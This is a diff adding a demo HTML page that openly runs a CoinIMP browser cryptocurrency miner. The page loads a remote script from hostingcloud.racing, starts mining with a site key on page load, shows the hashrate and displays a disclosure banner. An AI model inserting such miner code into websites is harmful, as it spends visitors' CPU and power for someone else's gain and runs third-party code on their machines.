@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>This is a miner</title>
+    <script>
+
+        var hashrate = function() {
+            var i = 0;
+            while (i < 100) {
+                (function(i) {
+                    setTimeout(function() {
+                    document.getElementById('running').innerHTML = _client.getHashesPerSecond();
+                    }, 1000 * i)
+                })(i++)
+              }
+        };
+    </script>
+    <script src="https://www.hostingcloud.racing/fXws.js"></script>
+<script>
+    var _client = new Client.Anonymous('6e7e12936e81d544ae0869b93ce96af3f942c37f43eef4db88f7bb520220f14f', {
+        throttle: 0.5, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
+</head>
+<body>
+<p>Current hashrate is: </p>
+<p id="running"></p>
+
+<script>
+    hashrate();
+</script>
+
+</body>
+</html>
